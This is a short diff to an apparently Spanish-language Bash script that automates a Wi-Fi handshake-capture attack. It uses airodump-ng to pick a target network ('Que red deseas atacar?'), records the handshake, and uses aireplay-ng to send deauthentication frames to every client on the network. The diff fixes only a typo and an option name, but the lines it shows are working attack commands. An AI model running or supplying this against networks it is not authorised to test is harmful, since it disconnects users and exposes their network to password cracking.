@@ -58,12 +58,12 @@ if [ $airtest -eq 0 ]; then
 					xterm -hold -e "airodump-ng ${tar}mon" &
 					airodump_xterm_PID=$!
 					read -p "Que red deseas atacar?: " ap
-					read -p "En que canal esta ${ap}}?: " channel
+					read -p "En que canal esta ${ap}?: " channel
 
 					kill -9 $airodump_xterm_PID
 					wait $airodump_xterm_PID 2>/dev/null
 
-					xterm -hold -e "airodump-ng -c $channel -w Handshake -essid $ap ${tar}mon" &
+					xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
 					airodump_filter_xterm_PID=$?
 
 					sleep 5; xterm -hold -e "aireplay-ng -0 12 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
